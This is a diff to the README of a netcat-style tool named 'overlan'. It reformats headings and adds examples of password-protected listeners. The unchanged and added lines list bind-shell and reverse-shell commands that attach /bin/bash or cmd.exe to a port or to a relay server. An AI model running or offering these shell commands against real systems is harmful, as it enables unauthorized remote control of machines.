@@ -56,6 +56,10 @@ Listen on localhost port 4444
 	
 	overlan -l 4444
 
+Listen password protected reverse shell on localhost port 4444
+	
+	overlan -l 4444 -k mysecret
+
 Listen on port 4444 and remote forward to overlan server port 8888
 	
 	overlan -l 4444 -R 8888
@@ -66,13 +70,17 @@ Connect to localhost port 4444
 	
 	overlan localhost 4444
 
+Connect to password protected bind shell listening on localhost port 4444
+	
+	overlan localhost 4444 -k mysecret
+
 Connect to overlan server port 4444
 	
 	overlan overlan 4444
 
 #### Port forwarding
 
-Overlan
+###### Overlan
 
 Remote forward localhost 4444 to overlan server port 8888
 
@@ -82,7 +90,7 @@ Local forward overlan server port 8888 to localhost 4444
 
 	overlan 8888 -L 4444
 
-SSH
+###### SSH
 
 Remote forward localhost 4444 to overlan server port 8888 
 
@@ -97,17 +105,21 @@ Local forward localhost 4444 to overlan server port 8888
 Unix
 
 - `overlan -l 4444 -e /bin/bash` - BindShell listen on localhost port 4444.
+
 - `overlan -l 4444 -e /bin/bash -R 8888` - BindShell listen on port 4444 and remote forward to overlan server port 8888.
 	
 - `overlan -l 4444 -e /bin/bash -k mypassowrd` - Password protected BindShell listen on localhost 4444.
+
 - `overlan -l 4444 -e /bin/bash -k mypassword -R 8888` - Password protected BindShell listen on port 4444 and remote forward to overlan server port 8888.
 
 Windows
 
 - `overlan -l 4444 -e cmd.exe` - BindShell listen on localhost port 4444.
+
 - `overlan -l 4444 -e cmd.exe -R 8888` - BindShell listen on port 4444 and remote forward to overlan server port 8888.
 	
 - `overlan -l 4444 -e cmd.exe -k mypassowrd` - Password protected BindShell listen on localhost port 4444.
+
 - `overlan -l 4444 -e cmd.exe -k mypassword -R 8888` - Password protected BindShell listen on port 4444 and remote forward to overlan server port 8888.
 
 #### Reverse Shell
@@ -115,15 +127,21 @@ Windows
 Unix
 
 - `overlan localhost 4444 -e /bin/bash` - ReverseShell connect to listener on localhost port 4444.
+
 - `overlan overlan 4444 -e /bin/bash` - ReverseShell connect to listener on overlan server port 4444.
+
 - `overlan localhost 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to localhost port 4444.
+
 - `overlan overlan 4444 -e /bin/bash -k mypassowrd` - Password protected ReverseShell connect to overlan server port 4444.
 
 Windows
 
 - `overlan localhost 4444 -e cmd.exe` - ReverseShell connect to listener on localhost port 4444.
+
 - `overlan overlan 4444 -e cmd.exe` - ReverseShell connect to listener on overlan server port 4444.
+
 - `overlan localhost 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to localhost port 4444.
+
 - `overlan overlan 4444 -e cmd.exe -k mypassowrd` - Password protected ReverseShell connect to overlan server port 4444.
 
 
